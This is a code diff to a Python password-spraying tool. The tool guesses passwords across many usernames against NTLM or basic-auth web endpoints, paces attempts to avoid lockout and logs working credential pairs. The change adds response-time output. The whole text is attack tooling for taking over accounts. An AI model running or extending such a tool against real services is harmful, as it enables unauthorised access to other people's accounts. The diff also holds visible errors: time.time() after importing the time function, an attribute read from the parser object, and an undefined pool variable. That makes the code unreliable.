@@ -5,7 +5,7 @@ from requests_ntlm2 import HttpNtlmAuth
 
 from base64 import b64encode as be, b64decode as bd
 import argparse
-from time import sleep
+from time import sleep, time
 from datetime import datetime
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -14,8 +14,8 @@ from multiprocessing import Pool
 
 def check_creds(opts):
 
-    url, domain, username, password, authtype, proxies = opts
-
+    url, domain, username, password, authtype, proxies, track_time = opts
+    start = time.time()
     if authtype == "ntlm":
         if domain:
             auth = HttpNtlmAuth(f"{domain}\\{username}", password)    
@@ -32,11 +32,15 @@ def check_creds(opts):
         res = requests.get(url, verify=False, proxies=proxies, auth=auth, allow_redirects=False)
 
         if res.status_code != 401:
-
-            print(f"Success! {username}:{password}")
+            if track_time:
+                print(f"Success! {username}:{password}  - {time.time() - start}s")
+            else:
+                print(f"Success! {username}:{password}")
 
             return username, password
 
+        elif track_time:
+            print(f"Fail:  {username}:{password}  - {time.time() - start}s")
     except Exception as e:
         print(f"Error occurred with {username}:{password}: {e}")
 
@@ -60,6 +64,7 @@ if __name__ == "__main__":
     args.add_argument('--proxy', help="Proxy server to route traffic through")
     args.add_argument('--threads', help="Number of threads", type=int, default=1)
     args.add_argument('--output', help="File to write successful pairs to", default="success.log")
+    args.add_argument("--add-response", help="Add response times to output", action="store_true")
     opts = args.parse_args()
 
     if opts.proxy and opts.authtype == 'basic':
@@ -86,12 +91,13 @@ if __name__ == "__main__":
         i += 1
 
         print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
-        attempts = [ (opts.url, opts.domain, u, p, opts.authtype, proxies) for u in usernames]
+        attempts = [ (opts.url, opts.domain, u, p, opts.authtype, proxies, args.add_response) for u in usernames]
         with Pool(opts.threads) as p:
             for s in pool.imap_unordered(check_creds, attempts):
             
                 if s:
                     f.write(f"{s[0]}:{s[1]}" + '\n')
+                    f.flush()
 
         if i == opts.attempts:
             print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
